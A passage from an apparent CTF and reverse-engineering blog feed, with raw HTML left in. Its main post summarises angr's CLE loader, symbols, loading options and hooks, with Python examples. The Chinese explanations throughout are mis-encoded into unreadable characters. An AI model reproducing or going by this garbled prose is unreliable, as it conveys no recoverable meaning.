class="hljs-number">0x9CF2D0A4</span>,<br>     <span class="hljs-number">0x83C061BA</span>, <span class="hljs-number">0x9BE96A4D</span>, <span class="hljs-number">0x8FE51550</span>, <span class="hljs-number">0xBA645BD6</span>,<br>     <span class="hljs-number">0x2826A2F9</span>, <span class="hljs-number">0xA73A3AE1</span>, <span class="hljs-number">0x4BA99586</span>, <span class="hljs-number">0xEF5562E9</span>,<br>     <span class="hljs-number">0xC72FEFD3</span>, <span class="hljs-number">0xF752F7DA</span>, <span class="hljs-number">0x3F046F69</span>, <span class="hljs-number">0x77FA0A59</span>,<br>     <span class="hljs-number">0x80E4A915</span>, <span class="hljs-number">0x87B08601</span>, <span class="hljs-number">0x9B09E6AD</span>, <span class="hljs-number">0x3B3EE593</span>,<br>     <span class="hljs-number">0xE990FD5A</span>, <span class="hljs-number">0x9E34D797</span>, <span class="hljs-number">0x2CF0B7D9</span>, <span class="hljs-number">0x022B8B51</span>,<br>     <span class="hljs-number">0x96D5AC3A</span>, <span class="hljs-number">0x017DA67D</span>, <span class="hljs-number">0xD1CF3ED6</span>, <span class="hljs-number">0x7C7D2D28</span>,<br>     <span class="hljs-number">0x1F9F25CF</span>, <span class="hljs-number">0xADF2B89B</span>, <span class="hljs-number">0x5AD6B472</span>, <span class="hljs-number">0x5A88F54C</span>,<br>     <span class="hljs-number">0xE029AC71</span>, <span class="hljs-number">0xE019A5E6</span>, <span class="hljs-number">0x47B0ACFD</span>, <span class="hljs-number">0xED93FA9B</span>,<br>     <span class="hljs-number">0xE8D3C48D</span>, <span class="hljs-number">0x283B57CC</span>, <span class="hljs-number">0xF8D56629</span>, <span class="hljs-number">0x79132E28</span>,<br>     <span class="hljs-number">0x785F0191</span>, <span class="hljs-number">0xED756055</span>, <span class="hljs-number">0xF7960E44</span>, <span class="hljs-number">0xE3D35E8C</span>,<br>     <span class="hljs-number">0x15056DD4</span>, <span class="hljs-number">0x88F46DBA</span>, <span class="hljs-number">0x03A16125</span>, <span class="hljs-number">0x0564F0BD</span>,<br>     <span class="hljs-number">0xC3EB9E15</span>, <span class="hljs-number">0x3C9057A2</span>, <span class="hljs-number">0x97271AEC</span>, <span class="hljs-number">0xA93A072A</span>,<br>     <span class="hljs-number">0x1B3F6D9B</span>, <span class="hljs-number">0x1E6321F5</span>, <span class="hljs-number">0xF59C66FB</span>, <span class="hljs-number">0x26DCF319</span>,<br>     <span class="hljs-number">0x7533D928</span>, <span class="hljs-number">0xB155FDF5</span>, <span class="hljs-number">0x03563482</span>, <span class="hljs-number">0x8ABA3CBB</span>,<br>     <span class="hljs-number">0x28517711</span>, <span class="hljs-number">0xC20AD9F8</span>, <span class="hljs-number">0xABCC5167</span>, <span class="hljs-number">0xCCAD925F</span>,<br>     <span class="hljs-number">0x4DE81751</span>, <span class="hljs-number">0x3830DC8E</span>, <span class="hljs-number">0x379D5862</span>, <span class="hljs-number">0x9320F991</span>,<br>     <span class="hljs-number">0xEA7A90C2</span>, <span class="hljs-number">0xFB3E7BCE</span>, <span class="hljs-number">0x5121CE64</span>, <span class="hljs-number">0x774FBE32</span>,<br>     <span class="hljs-number">0xA8B6E37E</span>, <span class="hljs-number">0xC3293D46</span>, <span class="hljs-number">0x48DE5369</span>, <span class="hljs-number">0x6413E680</span>,<br>     <span class="hljs-number">0xA2AE0810</span>, <span class="hljs-number">0xDD6DB224</span>, <span class="hljs-number">0x69852DFD</span>, <span class="hljs-number">0x09072166</span>,<br>     <span class="hljs-number">0xB39A460A</span>, <span class="hljs-number">0x6445C0DD</span>, <span class="hljs-number">0x586CDECF</span>, <span class="hljs-number">0x1C20C8AE</span>,<br>     <span class="hljs-number">0x5BBEF7DD</span>, <span class="hljs-number">0x1B588D40</span>, <span class="hljs-number">0xCCD2017F</span>, <span class="hljs-number">0x6BB4E3BB</span>,<br>     <span class="hljs-number">0xDDA26A7E</span>, <span class="hljs-number">0x3A59FF45</span>, <span class="hljs-number">0x3E350A44</span>, <span class="hljs-number">0xBCB4CDD5</span>,<br>     <span class="hljs-number">0x72EACEA8</span>, <span class="hljs-number">0xFA6484BB</span>, <span class="hljs-number">0x8D6612AE</span>, <span class="hljs-number">0xBF3C6F47</span>,<br>     <span class="hljs-number">0xD29BE463</span>, <span class="hljs-number">0x542F5D9E</span>, <span class="hljs-number">0xAEC2771B</span>, <span class="hljs-number">0xF64E6370</span>,<br>     <span class="hljs-number">0x740E0D8D</span>, <span class="hljs-number">0xE75B1357</span>, <span class="hljs-number">0xF8721671</span>, <span class="hljs-number">0xAF537D5D</span>,<br>     <span class="hljs-number">0x4040CB08</span>, <span class="hljs-number">0x4EB4E2CC</span>, <span class="hljs-number">0x34D2466A</span>, <span class="hljs-number">0x0115AF84</span>,<br>     <span class="hljs-number">0xE1B00428</span>, <span class="hljs-number">0x95983A1D</span>, <span class="hljs-number">0x06B89FB4</span>, <span class="hljs-number">0xCE6EA048</span>,<br>     <span class="hljs-number">0x6F3F3B82</span>, <span class="hljs-number">0x3520AB82</span>, <span class="hljs-number">0x011A1D4B</span>, <span class="hljs-number">0x277227F8</span>,<br>     <span class="hljs-number">0x611560B1</span>, <span class="hljs-number">0xE7933FDC</span>, <span class="hljs-number">0xBB3A792B</span>, <span class="hljs-number">0x344525BD</span>,<br>     <span class="hljs-number">0xA08839E1</span>, <span class="hljs-number">0x51CE794B</span>, <span class="hljs-number">0x2F32C9B7</span>, <span class="hljs-number">0xA01FBAC9</span>,<br>     <span class="hljs-number">0xE01CC87E</span>, <span class="hljs-number">0xBCC7D1F6</span>, <span class="hljs-number">0xCF0111C3</span>, <span class="hljs-number">0xA1E8AAC7</span>,<br>     <span class="hljs-number">0x1A908749</span>, <span class="hljs-number">0xD44FBD9A</span>, <span class="hljs-number">0xD0DADECB</span>, <span class="hljs-number">0xD50ADA38</span>,<br>     <span class="hljs-number">0x0339C32A</span>, <span class="hljs-number">0xC6913667</span>, <span class="hljs-number">0x8DF9317C</span>, <span class="hljs-number">0xE0B12B4F</span>,<br>     <span class="hljs-number">0xF79E59B7</span>, <span class="hljs-number">0x43F5BB3A</span>, <span class="hljs-number">0xF2D519FF</span>, <span class="hljs-number">0x27D9459C</span>,<br>     <span class="hljs-number">0xBF97222C</span>, <span class="hljs-number">0x15E6FC2A</span>, <span class="hljs-number">0x0F91FC71</span>, <span class="hljs-number">0x9B941525</span>,<br>     <span class="hljs-number">0xFAE59361</span>, <span class="hljs-number">0xCEB69CEB</span>, <span class="hljs-number">0xC2A86459</span>, <span class="hljs-number">0x12BAA8D1</span>,<br>     <span class="hljs-number">0xB6C1075E</span>, <span class="hljs-number">0xE3056A0C</span>, <span class="hljs-number">0x10D25065</span>, <span class="hljs-number">0xCB03A442</span>,<br>     <span class="hljs-number">0xE0EC6E0E</span>, <span class="hljs-number">0x1698DB3B</span>, <span class="hljs-number">0x4C98A0BE</span>, <span class="hljs-number">0x3278E964</span>,<br>     <span class="hljs-number">0x9F1F9532</span>, <span class="hljs-number">0xE0D392DF</span>, <span class="hljs-number">0xD3A0342B</span>, <span class="hljs-number">0x8971F21E</span>,<br>     <span class="hljs-number">0x1B0A7441</span>, <span class="hljs-number">0x4BA3348C</span>, <span class="hljs-number">0xC5BE7120</span>, <span class="hljs-number">0xC37632D8</span>,<br>     <span class="hljs-number">0xDF359F8D</span>, <span class="hljs-number">0x9B992F2E</span>, <span class="hljs-number">0xE60B6F47</span>, <span class="hljs-number">0x0FE3F11D</span>,<br>     <span class="hljs-number">0xE54CDA54</span>, <span class="hljs-number">0x1EDAD891</span>, <span class="hljs-number">0xCE6279CF</span>, <span class="hljs-number">0xCD3E7E6F</span>,<br>     <span class="hljs-number">0x1618B166</span>, <span class="hljs-number">0xFD2C1D05</span>, <span class="hljs-number">0x848FD2C5</span>, <span class="hljs-number">0xF6FB2299</span>,<br>     <span class="hljs-number">0xF523F357</span>, <span class="hljs-number">0xA6327623</span>, <span class="hljs-number">0x93A83531</span>, <span class="hljs-number">0x56CCCD02</span>,<br>     <span class="hljs-number">0xACF08162</span>, <span class="hljs-number">0x5A75EBB5</span>, <span class="hljs-number">0x6E163697</span>, <span class="hljs-number">0x88D273CC</span>,<br>     <span class="hljs-number">0xDE966292</span>, <span class="hljs-number">0x81B949D0</span>, <span class="hljs-number">0x4C50901B</span>, <span class="hljs-number">0x71C65614</span>,<br>     <span class="hljs-number">0xE6C6C7BD</span>, <span class="hljs-number">0x327A140A</span>, <span class="hljs-number">0x45E1D006</span>, <span class="hljs-number">0xC3F27B9A</span>,<br>     <span class="hljs-number">0xC9AA53FD</span>, <span class="hljs-number">0x62A80F00</span>, <span class="hljs-number">0xBB25BFE2</span>, <span class="hljs-number">0x35BDD2F6</span>,<br>     <span class="hljs-number">0x71126905</span>, <span class="hljs-number">0xB2040222</span>, <span class="hljs-number">0xB6CBCF7C</span>, <span class="hljs-number">0xCD769C2B</span>,<br>     <span class="hljs-number">0x53113EC0</span>, <span class="hljs-number">0x1640E3D3</span>, <span class="hljs-number">0x38ABBD60</span>, <span class="hljs-number">0x2547ADF0</span>,<br>     <span class="hljs-number">0xBA38209C</span>, <span class="hljs-number">0xF746CE76</span>, <span class="hljs-number">0x77AFA1C5</span>, <span class="hljs-number">0x20756060</span>,<br>     <span class="hljs-number">0x85CBFE4E</span>, <span class="hljs-number">0x8AE88DD8</span>, <span class="hljs-number">0x7AAAF9B0</span>, <span class="hljs-number">0x4CF9AA7E</span>,<br>     <span class="hljs-number">0x1948C25C</span>, <span class="hljs-number">0x02FB8A8C</span>, <span class="hljs-number">0x01C36AE4</span>, <span class="hljs-number">0xD6EBE1F9</span>,<br>     <span class="hljs-number">0x90D4F869</span>, <span class="hljs-number">0xA65CDEA0</span>, <span class="hljs-number">0x3F09252D</span>, <span class="hljs-number">0xC208E69F</span>,<br>     <span class="hljs-number">0xB74E6132</span>, <span class="hljs-number">0xCE77E25B</span>, <span class="hljs-number">0x578FDFE3</span>, <span class="hljs-number">0x3AC372E6</span>]]<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Loading a Binary</title>
    <link href="/2023/05/26/Loading%20a%20Binary/"/>
    <url>/2023/05/26/Loading%20a%20Binary/</url>
    
    <content type="html"><![CDATA[<p><a href="https://docs.angr.io/en/latest/core-concepts/loading.html">Loading a Binary</a></p><span id="more"></span><p>angræ˜¯é€šè¿‡CLEæ¨¡å—æ¥è£…è½½ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´CLEçš„æ¥å£ä¹Ÿå¯ä»¥ç”¨äºangrã€‚</p><h2 id="The-Loader"><a href="#The-Loader" class="headerlink" title="The Loader"></a>The Loader</h2><p>ç›®å‰æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹å‡ è¡Œä»£ç è£…è½½ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr, monkeyhex<br>proj = angr.Project(<span class="hljs-string">&#x27;examples/fauxware/fauxware&#x27;</span>)<br>proj.loader<br>&lt;Loaded fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x5008000</span>]&gt;<br></code></pre></td></tr></table></figure><h3 id="Loaded-Objects"><a href="#Loaded-Objects" class="headerlink" title="Loaded Objects"></a>Loaded Objects</h3><p>å‰é¢æåˆ°Angrä½¿ç”¨CLEæ¥è£…è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€ŒCLEè£…è½½å™¨å³<code>cle.Loader</code>è£…è½½äº†è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„æ‰€æœ‰objectsï¼Œå¹¶ä¸”æŠŠä»–ä»¬æ˜ å°„åˆ°ä¸€ä¸ªå†…å­˜åœ°å€ã€‚æ¯ä¸€ä¸ªä¸åŒç±»å‹çš„binary objecéƒ½å¯ä»¥ç”±<code>cle.Backend</code>å¤„ç†ï¼Œæ¯”å¦‚<code>cle.ELF</code>å°±æ˜¯ç”¨æ¥è£…è½½ELFæ–‡ä»¶ã€‚</p><h4 id="loader-all-objects"><a href="#loader-all-objects" class="headerlink" title="loader.all_objects"></a>loader.all_objects</h4><p>å¯ä»¥é€šè¿‡<code>loader.all_objects</code>æ¥è·å¾—CLEè£…è½½æ‰€æœ‰objectsçš„åˆ—è¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># All loaded objects</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.all_objects<br>[&lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;,<br> &lt;ELF Object libc-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x1000000</span>:<span class="hljs-number">0x13c999f</span>]&gt;,<br> &lt;ELF Object ld-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x2000000</span>:<span class="hljs-number">0x2227167</span>]&gt;,<br> &lt;ELFTLSObject Object cle<span class="hljs-comment">##tls, maps [0x3000000:0x3015010]&gt;,</span><br> &lt;ExternObject Object cle<span class="hljs-comment">##externs, maps [0x4000000:0x4008000]&gt;,</span><br> &lt;KernelObject Object cle<span class="hljs-comment">##kernel, maps [0x5000000:0x5008000]&gt;]</span><br><br><span class="hljs-comment"># main object ä¹Ÿå°±æ˜¯éœ€è¦æˆ‘ä»¬å…³æ³¨çš„é‚£ä¸ªobject</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object<br>&lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;<br><br><span class="hljs-comment"># ä»åå­—åˆ°åœ°å€çš„æ˜ å°„</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.shared_objects<br>&#123; <span class="hljs-string">&#x27;fauxware&#x27;</span>: &lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;,<br>  <span class="hljs-string">&#x27;libc.so.6&#x27;</span>: &lt;ELF Object libc-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x1000000</span>:<span class="hljs-number">0x13c999f</span>]&gt;,<br>  <span class="hljs-string">&#x27;ld-linux-x86-64.so.2&#x27;</span>: &lt;ELF Object ld-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x2000000</span>:<span class="hljs-number">0x2227167</span>]&gt; &#125;<br><br><span class="hljs-comment"># ä»ELFè£…è½½çš„æ‰€æœ‰æ–‡ä»¶</span><br><span class="hljs-comment"># å¦‚æœæ˜¯PEç¨‹åº ä½¿ç”¨all_pe_objects</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.all_elf_objects<br>[&lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;,<br> &lt;ELF Object libc-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x1000000</span>:<span class="hljs-number">0x13c999f</span>]&gt;,<br> &lt;ELF Object ld-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x2000000</span>:<span class="hljs-number">0x2227167</span>]&gt;]<br><br><span class="hljs-comment"># å¤„ç†å¤–éƒ¨å¯¼å…¥</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.extern_object<br>&lt;ExternObject Object cle<span class="hljs-comment">##externs, maps [0x4000000:0x4008000]&gt;</span><br><br><span class="hljs-comment"># æ­¤objectæä¾›ç³»ç»Ÿè°ƒç”¨åœ°å€</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.kernel_object<br>&lt;KernelObject Object cle<span class="hljs-comment">##kernel, maps [0x5000000:0x5008000]&gt;</span><br><br><span class="hljs-comment"># é€šè¿‡åœ°å€æ‰¾object</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.find_object_containing(<span class="hljs-number">0x400000</span>)<br>&lt;ELF Object fauxware, maps [<span class="hljs-number">0x400000</span>:<span class="hljs-number">0x60105f</span>]&gt;<br></code></pre></td></tr></table></figure><h4 id="ä¸objectäº¤äº’"><a href="#ä¸objectäº¤äº’" class="headerlink" title="ä¸objectäº¤äº’"></a>ä¸objectäº¤äº’</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">obj = proj.loader.main_object<br><br><span class="hljs-comment"># å…¥å£ç‚¹</span><br>obj.entry<br><span class="hljs-number">0x400580</span><br><br><span class="hljs-comment"># èµ·å§‹ ç»ˆæ­¢</span><br>obj.min_addr, obj.max_addr<br>(<span class="hljs-number">0x400000</span>, <span class="hljs-number">0x60105f</span>)<br><br><span class="hljs-comment"># segments</span><br>obj.segments<br>&lt;Regions: [&lt;ELFSegment memsize=<span class="hljs-number">0xa74</span>, filesize=<span class="hljs-number">0xa74</span>, vaddr=<span class="hljs-number">0x400000</span>, flags=<span class="hljs-number">0x5</span>, offset=<span class="hljs-number">0x0</span>&gt;,<br>           &lt;ELFSegment memsize=<span class="hljs-number">0x238</span>, filesize=<span class="hljs-number">0x228</span>, vaddr=<span class="hljs-number">0x600e28</span>, flags=<span class="hljs-number">0x6</span>, offset=<span class="hljs-number">0xe28</span>&gt;]&gt;<br><span class="hljs-comment"># sections</span><br>obj.sections<br>&lt;Regions: [&lt;Unnamed | offset <span class="hljs-number">0x0</span>, vaddr <span class="hljs-number">0x0</span>, size <span class="hljs-number">0x0</span>&gt;,<br>           &lt;.interp | offset <span class="hljs-number">0x238</span>, vaddr <span class="hljs-number">0x400238</span>, size <span class="hljs-number">0x1c</span>&gt;,<br>           &lt;.note.ABI-tag | offset <span class="hljs-number">0x254</span>, vaddr <span class="hljs-number">0x400254</span>, size <span class="hljs-number">0x20</span>&gt;,<br>            ...etc<br><br><span class="hljs-comment"># åˆ©ç”¨åœ°å€å»æ‰¾segment æˆ–è€… section</span><br>obj.find_segment_containing(obj.entry)<br>&lt;ELFSegment memsize=<span class="hljs-number">0xa74</span>, filesize=<span class="hljs-number">0xa74</span>, vaddr=<span class="hljs-number">0x400000</span>, flags=<span class="hljs-number">0x5</span>, offset=<span class="hljs-number">0x0</span>&gt;<br>obj.find_section_containing(obj.entry)<br>&lt;.text | offset <span class="hljs-number">0x580</span>, vaddr <span class="hljs-number">0x400580</span>, size <span class="hljs-number">0x338</span>&gt;<br><br><span class="hljs-comment"># pltè¡¨æ‰¾ç¬¦å·</span><br>addr = obj.plt[<span class="hljs-string">&#x27;strcmp&#x27;</span>]<br>addr<br><span class="hljs-number">0x400550</span><br>obj.reverse_plt[addr]<br><span class="hljs-string">&#x27;strcmp&#x27;</span><br><br><span class="hljs-comment"># Show the prelinked base of the object and the location it was actually mapped into memory by CLE</span><br>obj.linked_base<br><span class="hljs-number">0x400000</span><br>obj.mapped_base<br><span class="hljs-number">0x400000</span><br></code></pre></td></tr></table></figure><h3 id="Symbols-and-Relocations"><a href="#Symbols-and-Relocations" class="headerlink" title="Symbols and Relocations"></a>Symbols and Relocations</h3><p>symbolæ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„é‡è¦æ¦‚å¿µï¼Œå®Œæˆä»åå­—åˆ°åœ°å€çš„æ˜ å°„</p><p>å¯ä»¥åˆ©ç”¨<code>loader.find_symbol</code>å¯»æ‰¾ç‰¹å®šsymbol,å®ƒçš„å‚æ•°å¯ä»¥æ˜¯åå­—ï¼Œä¹Ÿå¯ä»¥æ˜¯åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">strcmp = proj.loader.find_symbol(<span class="hljs-string">&#x27;strcmp&#x27;</span>)<br>strcmp<br>&lt;Symbol <span class="hljs-string">&quot;strcmp&quot;</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> at <span class="hljs-number">0x1089cd0</span>&gt;<br></code></pre></td></tr></table></figure><p>symbolæœ‰ä¸‰ç§å½¢å¼åœ°å€</p><p><code>.rebased_addr</code> æ˜¯å…¨å±€åœ°å€ç©ºé—´çš„åœ°å€</p><p><code>.linked_addr</code> é¢„é“¾æ¥åœ°å€</p><p><code>.relative_addr</code> å³RVA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">strcmp.name<br><span class="hljs-string">&#x27;strcmp&#x27;</span><br><br>strcmp.owner<br>&lt;ELF Object libc-<span class="hljs-number">2.23</span>.so, maps [<span class="hljs-number">0x1000000</span>:<span class="hljs-number">0x13c999f</span>]&gt;<br><br>strcmp.rebased_addr<br><span class="hljs-number">0x1089cd0</span><br>strcmp.linked_addr<br><span class="hljs-number">0x89cd0</span><br>strcmp.relative_addr<br><span class="hljs-number">0x89cd0</span><br></code></pre></td></tr></table></figure><h2 id="Loading-Options"><a href="#Loading-Options" class="headerlink" title="Loading Options"></a>Loading Options</h2><p>å¯ä»¥ç»™angr.Projectä¼ ä¸€äº›å‚æ•°ï¼Œä»¥æ­¤æ¥çº¦æŸåŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶çš„è¡Œä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span>auto_load_libs  å†³å®šæ˜¯å¦åŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼Œé»˜è®¤å¼€å¯<br><span class="hljs-number">2.</span>skip_libs       è·³è¿‡è¿™äº›ä¾èµ–åº“<br><span class="hljs-number">3.</span>ld_path         å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“çš„è·¯å¾„<br><span class="hljs-number">4.</span>backend         åç«¯ï¼Œæ¯”å¦‚ blob<br><span class="hljs-number">5.</span>base_addr       åŸºå€<br><span class="hljs-number">6.</span>entry_point     å…¥å£ç‚¹<br><span class="hljs-number">7.</span>arch            æ¶æ„<br></code></pre></td></tr></table></figure><h3 id="Symbolic-Function-Summaries"><a href="#Symbolic-Function-Summaries" class="headerlink" title="Symbolic Function Summaries"></a>Symbolic Function Summaries</h3><p>Projectä¼šå°†å¤–éƒ¨çš„callè½¬åŒ–ä¸ºè‡ªå·±çš„ç¬¦å·æ‰§è¡Œï¼Œangrå·²ç»æŠŠä¸€æ•´å¥—çš„å¤–éƒ¨åº“å‡½æ•°ç»™æ¨¡æ‹Ÿä¸ºSimProceduresäº†ï¼Œ</p><p>å¯ä»¥åœ¨<code>angr.SIM_PROCEDURES</code>å­—å…¸è®¿é—®ï¼Œé”®å€¼æ˜¯åº“çš„åå­—ï¼Œå¯¹è±¡æ˜¯è¿™ä¸ªåº“çš„å‡½æ•°åå­—</p><p>å¦‚æœæ²¡æœ‰è¿™ä¸ªå¤–éƒ¨å‡½æ•°çš„SimProcedueres:</p><p><code>auto_load_libs</code> is <code>True</code> (default), æ‰§è¡ŒåŸæ¥çš„å‡½æ•°</p><p><code>auto_load_libs</code> is <code>False</code>, ä¹Ÿæ˜¯æ¨¡æ‹Ÿæ‰§è¡Œï¼Œä½†è¿”å›ä¸€ä¸ªæ— çº¦æŸçš„çŠ¶æ€</p><p><code>use_sim_procedures</code>ï¼Œè¿™ä¸ªæ˜¯<code>angr.Project</code>çš„å‚æ•°ï¼Œå¦‚æœæ˜¯Falseï¼Œåªä¼šæ¨¡æ‹Ÿæ‰§è¡Œæ­¤symbols.é»˜è®¤æ˜¯True</p><p>Hook</p><p><code>proj.hook(addr, hook)</code>, where <code>hook</code> is a SimProcedure instance. You can manage your projectâ€™s hooks with <code>.is_hooked</code>, <code>.unhook</code>, and <code>.hooked_by</code>, which should hopefully not require explanation.</p><p>å¯ä»¥æŒ‡å®šlengthå‚æ•°ï¼Œæ¥å†³å®šhookåè·³å¤šå°‘ä¸ªbytesæŒ‡ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">stub_func = angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;stubs&#x27;</span>][<span class="hljs-string">&#x27;ReturnUnconstrained&#x27;</span>] <span class="hljs-comment"># this is a CLASS</span><br>proj.hook(<span class="hljs-number">0x10000</span>, stub_func())  <span class="hljs-comment"># hook with an instance of the class</span><br><br>proj.is_hooked(<span class="hljs-number">0x10000</span>)            <span class="hljs-comment"># these functions should be pretty self-explanitory</span><br><span class="hljs-literal">True</span><br>proj.hooked_by(<span class="hljs-number">0x10000</span>)<br>&lt;ReturnUnconstrained&gt;<br><br>proj.unhook(<span class="hljs-number">0x10000</span>)<br><br><span class="hljs-meta">@proj.hook(<span class="hljs-params"><span class="hljs-number">0x20000</span>, length=<span class="hljs-number">5</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook</span>(<span class="hljs-params">state</span>):<br>    state.regs.rax = <span class="hljs-number">1</span><br><br>proj.is_hooked(<span class="hljs-number">0x20000</span>)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>angrè¿™æ ·æè¿°hook</p><blockquote><p>Furthermore, you can use <code>proj.hook_symbol(name, hook)</code>, providing the name of a symbol as the first argument, to hook the address where the symbol lives. One very important usage of this is to extend the behavior of angrâ€™s built-in library SimProcedures. Since these library functions are just classes, you can subclass them, overriding pieces of their behavior, and then use your subclass in a hook.</p></blockquote><p>ä¹Ÿå³æˆ‘ä»¬å¯ä»¥ç”¨<code>proj.hook_symbol(name,hook)</code>æ¥æ›¿æ¢angrå†…ç½®çš„å‡½æ•°ï¼Œä»¥æˆ‘ä»¬çš„æ–¹å¼å®ç°</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>miniLCTF2023 maze_aot</title>
    <link href="/2023/05/25/miniLCTF2023%20maze_aot/"/>
    <url>/2023/05/25/miniLCTF2023%20maze_aot/</url>
    
